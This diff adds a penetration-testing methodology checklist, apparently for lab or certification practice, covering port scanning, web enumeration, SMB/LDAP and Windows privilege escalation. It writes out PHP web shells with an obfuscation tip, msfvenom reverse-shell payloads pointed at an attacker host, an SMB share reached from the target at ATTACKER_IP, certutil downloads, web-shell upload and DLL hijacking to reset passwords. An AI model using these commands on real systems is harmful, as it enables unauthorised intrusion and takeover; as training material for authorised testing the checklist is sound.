@@ -1,0 +1,166 @@
+1. Run NMAP
+	1. All ports
+		a. Nmap -p-
+	2. With safe scripts
+		a. Nmap -p[ports discovered] -sC -sV -oA
+2. Ports discovered
+3. Enumerate ports from the top down
+	1. If we are in a rabbit hole after 45-60 minutes, stop and go on to the next port.
+4. What's on port 21?
+	1. Anonymous login?
+5. Port 80?
+	1. Content Discovery
+		a. Gobuster
+		b. Ffuf
+		c. feroxbuster
+	2. Source code?
+	3. Comments?
+	4. Parameters?
+	5. Application / Software Versions?
+		a. Check source code or bottom of page.
+	6. Running Wordpress?
+	7. Exploit-DB?
+	8. Reverse shells?
+	9. Upload functionality?
+	10. Php script to create parameter for LFI?
+		a. <?php system($_GET["cmd"]);?>
+		b. We can also upgrade and add obfuscation from  https://www.gaijin.at/en/tools/php-obfuscator
+		<?php
+		    $cmd = $_GET["ch1r0n1n"];
+		    if(isset($cmd)){
+		        echo "<pre>" . shell_exec($cmd) . "</pre>";
+		    }
+		    die();
+		?>
+	11. Use the obfuscator link with this code.
+		a. This is a more secure shell in case our one-liner fails.
+	a. aspx reverse shell?
+		a. Msfvenom?
+			i. msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
+	1. Nikto scan
+6. Port 139,445
+	1. Enum4linux
+	2. Smbclient -L \\\\[NAME]\\[SHARE]
+7. IMPACKET:
+	1. sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .
+8. We can use impacket to create an SMB server share to interact with a target
+	1. sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+9. Connect to it from the target machine
+	1. net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
+10. Ldap?
+	1. Use ldapsearch to enumerate and see what we can find
+		a. ldapsearch -v -x -b "DC=[NAME1],DC=[NAME2]" -H "ldap://[IP]"
+11. Cadaver
+	1. If we have credentials, we can use this to upload a web shell
+	2. Cadaver http://{IP]
+	3. Enter username and password
+12. If we upload a webshell to an IIS server, the file path is most likely
+	1. C:\inetpub\wwwroot
+13. For file transfers we can use certutil
+	· certutil.exe -urlcache -split -f "<URL>"
+14. RDP on 3389?
+15. CVEs?
+16. Other random ports
+	1. 
+
+PRIVILEGE ESCALATION
+INFORMATION GATHERING
+17. Current user privileges = whoami /priv
+18. List users = net users
+19. List user details = ner user [USERNAME]
+20. User Groups on a System = net localgroup
+21. List members of a group = net localgroup [GROUPNAME]
+
+COLLECTING SYSTEM INFORMATION
+22. Systeminfo
+23. OS Version = systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+SEARCH FOR FILES
+24. Findstr
+25. findstr /si password *.txt
+
+PATCH LEVELS
+26. wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+NETWORK CONNECTIONS
+27. Netstat -ano
+
+SCHEDULED TASKS
+28. Schtasks
+29. schtasks /query /fo LIST /v
+
+DRIVERS
+30. Driverquery
+
+WINDOWS DEFENDER
+31. sc query windefend
+
+POST EXPLOITATION:
+32. Windows exploit suggestor
+33. Navigate to C:\Temp
+34. Find out who we are
+	1) Whoami
+35. Find out what we can do
+	1) Whoami /priv
+36. What groups we are in
+	1) Whoami /groups
+System Enumeration
+	1) Run systeminfo | findstr /B /C:”OS Name” /C:”OS Version” /C:”System Type”
+	2) Wmic qfe to display system patches and fixes. This can be used to find vulnerabilities used for privilege escalation.
+	3) To clean this up, we can instead use “wmic qfe get Caption,Description,HotFixID,InstalledOn”
+	4) Wmic logicaldisk get caption,description,providername
+37. Check network tables
+	1) Arp -a
+	2) Netstat -ano
+38. Check arp table
+39. Check the /etc/hosts file in linux
+40. Check the C:\Windows\System32\drivers\etc\hosts on Windows
+41. For windows, we can use PoshNmap
+	1) Install-Module -Name PoshNmap
+42. Use accesscheck.exe to find privilege escalation points.
+43. Unquoted Service Paths
+
+44. WinPEAS
+	1) https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+	2) Upload winpeas via file transfer
+	3) Set the execute permissions
+		a. Chmod +x winpeas.sh
+	4) Run linpeas
+		a. ./winpeas.exe
+45. POWERUP.PS1
+	1) This tool searches common privilege escalation points on the system
+	2) https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+	3) powershell.exe -nop -exec bypass
+	4) Import-Module .\PowerUp.ps1
+	5) Invoke-AllChecks
+46. VULNERABLE SOFTWARE
+	1) wmic product get name,version,vendor
+	2) wmic service list brief
+	3) wmic service list brief | findstr  "Running"
+	4) Query the service with "sc qc"
+47. DLL HIJACKING
+	1) We can find DLL files by visiting C:\Windows\System32 folder
+	2) We can also attempt to download and run Process Monitor
+	3) Manipulating DLL files could mean replacing existing files or creating a file in the location where the application is looking for it.
+	4) We can create a C script designed to change a users password.
+	5) First we create and compile the script on our system.
+	6) Cross compile the application
+	7) Put the new .dll file in the C:\Temp folder
+	8) Start and stop the DLL service
+		a. Sc stop dllsvc
+		b. Sc start dllsvc
+	9) Log out the system
+	10) Log in with new credentials
+48. UNQUOTED SERVICE PATH
+	1) We can use accesscheck to help find permissions on an Unquoted Service Path.
+		a. .\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
+	2) To determine a potential target the overall path to look for in the accesscheck is the following
+		a. No Quotation marks around the path
+		b. The directory hierarchy  would have more that one folder with spaces in it
+			i. C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+		c. Use accesscheck to find the permissions on this folder
+			i. .\accesschk64.exe /accepteula -uwq "C:\Program Files\Unquoted Path Service\"
+	3) Use msfvenom to create a reverse shell file
+		a. msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe
+	4) Use Remmina Remote Desktop Client to easily connect to the host and share a folder with our scripts in it.
+	
